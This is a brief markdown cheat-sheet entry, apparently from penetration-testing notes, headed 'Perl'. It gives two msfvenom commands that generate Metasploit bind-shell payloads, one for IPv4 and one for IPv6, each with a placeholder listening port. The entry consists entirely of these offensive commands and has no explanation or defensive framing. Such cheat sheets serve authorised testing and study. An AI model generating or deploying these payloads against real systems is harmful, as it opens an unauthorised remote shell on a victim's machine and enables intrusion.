# Perl

## 01 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/bind_perl lport=<PORT>

$ msfvenom -p cmd/unix/bind_perl_ipv6 lport=<PORT>
```